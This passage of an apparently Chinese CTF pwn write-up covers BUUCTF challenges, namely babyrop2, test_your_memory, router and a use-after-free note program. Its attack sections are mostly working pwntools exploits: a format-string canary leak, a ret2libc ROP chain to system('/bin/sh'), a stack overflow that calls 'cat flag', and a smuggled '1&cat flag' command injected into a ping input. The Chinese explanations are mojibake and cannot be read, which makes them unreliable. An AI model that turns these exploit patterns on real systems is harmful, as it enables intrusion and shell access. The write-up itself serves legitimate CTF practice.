read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gift()ä¸­æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œé™åˆ¶äº†é•¿åº¦ï¼Œä½†æ˜¯å¯ä»¥æ³„éœ²canaryå€¼ã€‚</p><p>é€šè¿‡è°ƒè¯•å¯ä»¥çŸ¥é“canaryåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åé¢</p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»æ˜¯6ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./bjdctf_2020_babyrop2&quot;</span>)</span><br><span class="line">fmt_str = <span class="number">0x0400A01</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400993</span></span><br><span class="line">io.recv()</span><br><span class="line">gdb.attach(io)</span><br><span class="line">payload = <span class="string">&quot;aa%6$p&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥canaryæ˜¯7.</p><p>æ¥ä¸‹æ¥å°±æ˜¯ç®€å•çš„æ ˆæº¢å‡ºäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./bjdctf_2020_babyrop2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26953</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bjdctf_2020_babyrop2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400993</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&quot;%7$p&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;canary--&gt;&quot;</span>,canary)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*(<span class="number">0x20</span> -<span class="number">8</span>) +p64(canary) + p64(<span class="number">123</span>) + p64(pop_rdi_ret) + p64(puts_got)+p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;story!\n&quot;</span>,payload)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts--&gt;&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x18</span>) +p64(canary) + p64(<span class="number">0</span>) +p64(pop_rdi_ret) + p64(bin_sh) + p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x24-jarvisoj-test-your-memory"><a href="#0x24-jarvisoj-test-your-memory" class="headerlink" title="0x24.jarvisoj_test_your_memory"></a>0x24.jarvisoj_test_your_memory</h2><p>çœ‹äº†çœ‹é¢˜ç›®ï¼Œä»¥ä¸ºä¼šå¾ˆéš¾ï¼Œï¼Œï¼Œï¼Œç»“æœå…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸ªç®€å•çš„æ ˆé¢˜ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">11</span>]; <span class="comment">// [esp+1Dh] [ebp-13h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">10</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n\n------Test Your Memory!-------\n&quot;</span>);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">    s2[i] = alphanum_2626[rand() % <span class="number">0x3E</span>u];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s2);</span><br><span class="line">  mem_test(s2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">mem_test</span><span class="params">(<span class="keyword">char</span> *s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">19</span>]; <span class="comment">// [esp+15h] [ebp-13h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0xB</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nwhat???? : &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x%x \n&quot;</span>, hint);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;cff flag go go go ...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s, s2, <span class="number">4u</span>) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;good job!!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;cff flag is failed!!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./memory&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27913</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./memory&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">cat_flag = <span class="number">0x080487E0</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.recvuntil(&quot;&gt; &quot;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x13</span>+<span class="number">4</span>) + p32(system)+p32(main) + p32(cat_flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x25-bjdctf-2020-router"><a href="#0x25-bjdctf-2020-router" class="headerlink" title="0x25.bjdctf_2020_router"></a>0x25.bjdctf_2020_router</h2><p>emmmâ€¦.è¿™é¢˜æ€ä¹ˆè¯´å‘¢çœ‹äº†åŠå¤©ï¼Œç»“æœç®—æ˜¯ä¸ªè„‘æ´é¢˜å§ï¼Œå°±linuxå‘½ä»¤æ‹¼æ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-74h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+30h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+34h] [rbp-4Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">56</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  *(_QWORD *)dest = <span class="string">&#x27; gnip&#x27;</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to BJDCTF router test program! &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input u choose:&quot;</span>);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:                                   <span class="comment">// ping</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Please input the ip address:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>(dest, buf);</span><br><span class="line">        system(dest);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:                                   <span class="comment">// test</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;bibibibbibibib~~~&quot;</span>);</span><br><span class="line">        sleep(<span class="number">3u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ziziizzizi~~~&quot;</span>);</span><br><span class="line">        sleep(<span class="number">3u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;something wrong!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Test done!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:                                   <span class="comment">// leave comments</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Please input what u want to say&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Your suggest will help us to do better!&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, v10, <span class="number">0x3A</span>uLL);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dear ctfer,your suggest is :%s&quot;</span>, v10);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:                                   <span class="comment">// root</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Hey guys,u think too much!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Good Bye!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Functional development!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./bjdctf_2020_router&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28235</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;1&amp;cat flag&quot;</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><h2 id="0x26-hitcontraining-uaf"><a href="#0x26-hitcontraining-uaf" class="headerlink" title="0x26.hitcontraining_uaf"></a>0x26.hitcontraining_uaf</h2><p>ä¸€å¼€å§‹æ€»æ˜¯æŒ‡é’ˆåç§»çš„å½¢å¼å±•ç¤ºnotelistï¼ŒæŒ‰yç„¶åchar * æˆ–è€…char**å°±å¯ä»¥æ•°ç»„æ˜¾ç¤ºäº†ã€‚(intä¹Ÿå¯)</p><p>add:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> **<span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> **result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> **v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  result = count;</span><br><span class="line">  <span class="keyword">if</span> ( count &gt; <span class="number">5</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (&amp;notelist)[i];</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      (&amp;notelist)[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;notelist)[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(&amp;notelist)[i] = print_note_content;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v1 = (&amp;notelist)[i];</span><br><span class="line">      v1[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;notelist)[i][<span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, (&amp;notelist)[i][<span class="number">1</span>], size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> ++count;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addä¸­é¦–å…ˆmallocäº†8ï¼Œåˆ†åˆ«å­˜æ”¾print_note_contentå’Œcontentçš„åœ°å€ã€‚</p><p>print:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> **<span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> **result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = (&amp;notelist)[v2];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    result = (*(&amp;notelist)[v2])((&amp;notelist)[v2]);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰“å°print_note_content((&amp;notelist)[v2])ã€‚</p><p>deleteï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *<span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = (&amp;notelist)[v2];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;notelist)[v2][<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>((&amp;notelist)[v2]);</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delåªæ˜¯freeå¹¶æ²¡æœ‰æŠŠæŒ‡é’ˆç½®ç©ºï¼Œå­˜åœ¨uaf</p><p>åé¢è¿˜æœ‰ä¸ªåé—¨å‡½æ•°magic</p><p>æ€è·¯ï¼š</p><ul><li>  å…ˆåˆ›å»ºä¸¤ä¸ªï¼Œç„¶ådeleteæ‰</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x10: 0x923a038 â€”â–¸ 0x923a000 â—‚â€” 0x0</span><br><span class="line">0x18: 0x0</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x28: 0x923a048 â€”â–¸ 0x923a010 â—‚â€” 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x38: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>  ä¹‹ååˆ›å»ºä¸€ä¸ªï¼Œå¾€é‡Œé¢å†™magicçš„åœ°å€å°±OK</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x10: 0x0</span><br><span class="line">0x18: 0x0</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x28: 0x923a048 â€”â–¸ 0x923a010 â—‚â€” 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x38: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 